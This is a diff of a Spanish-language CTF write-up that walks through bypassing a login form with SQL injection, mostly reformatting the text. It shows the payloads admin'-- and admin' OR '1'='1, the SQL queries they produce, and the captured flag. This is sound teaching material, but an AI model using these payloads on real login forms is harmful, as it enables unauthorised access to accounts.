@@ -1,19 +1,19 @@
 ---
-title: "SQL Injection en Login - WebCTF 2024"
-description: "Explotar una vulnerabilidad de inyección SQL en un formulario de login para obtener acceso administrativo."
-ctfName: "WebCTF 2024"
-category: "web"
-difficulty: "easy"
+title: 'SQL Injection en Login - WebCTF 2024'
+description: 'Explotar una vulnerabilidad de inyección SQL en un formulario de login para obtener acceso administrativo.'
+ctfName: 'WebCTF 2024'
+category: 'web'
+difficulty: 'easy'
 points: 150
-pubDate: 2024-11-05
-heroImage: "/images/ctf/default-ctf.png"
-tags: ["web", "sql-injection", "authentication-bypass", "sqli"]
+pubDate: 2026-04-09
+heroImage: '/images/ctf/default-ctf.png'
+tags: ['web', 'sql-injection', 'authentication-bypass', 'sqli']
 language: es
 solves: 1456
-author: "WebCTF Team"
-skillLevel: "beginner"
-estimatedTime: "30-45 minutos"
-tools: ["burpsuite", "sqlmap", "browser-devtools"]
+author: 'WebCTF Team'
+skillLevel: 'beginner'
+estimatedTime: '30-45 minutos'
+tools: ['burpsuite', 'sqlmap', 'browser-devtools']
 ---
 
 # SQL Injection en Login - WebCTF 2024
@@ -28,8 +28,8 @@ Al acceder al sitio encontramos un formulario simple:
 
 ```html
 <form method="POST" action="/login">
-  <input type="text" name="username" placeholder="Usuario">
-  <input type="password" name="password" placeholder="Contraseña">
+  <input type="text" name="username" placeholder="Usuario" />
+  <input type="password" name="password" placeholder="Contraseña" />
   <button type="submit">Login</button>
 </form>
 ```
@@ -37,6 +37,7 @@ Al acceder al sitio encontramos un formulario simple:
 ## Pruebas Iniciales
 
 Probamos con credenciales normales:
+
 - Usuario: `admin`
 - Contraseña: `password`
 
@@ -45,6 +46,7 @@ Probamos con credenciales normales:
 ## Detectando la Vulnerabilidad
 
 Probamos con una comilla simple en el campo usuario:
+
 ```
 Usuario: admin'
 Password: password
@@ -57,6 +59,7 @@ Password: password
 ## Análisis de la Query
 
 La consulta probablemente sea:
+
 ```sql
 SELECT * FROM users WHERE username='admin'' AND password='password'
 ```
@@ -68,11 +71,12 @@ SELECT * FROM users WHERE username='admin'' AND password='password'
 Podemos comentar el resto de la query:
 
 ```
-Usuario: admin'-- 
+Usuario: admin'--
 Password: cualquiera
 ```
 
 La query resultante:
+
 ```sql
 SELECT * FROM users WHERE username='admin'-- ' AND password='cualquiera'
 ```
@@ -87,6 +91,7 @@ Password: cualquiera
 ```
 
 Query resultante:
+
 ```sql
 SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='cualquiera'
 ```
@@ -102,6 +107,7 @@ Usando el payload `admin'-- ` en el campo usuario:
 3. ¡Acceso concedido!
 
 **Respuesta del servidor**:
+
 ```
 Welcome, admin!
 Flag: CTF{sql_1nj3ct10n_1s_d4ng3r0us}
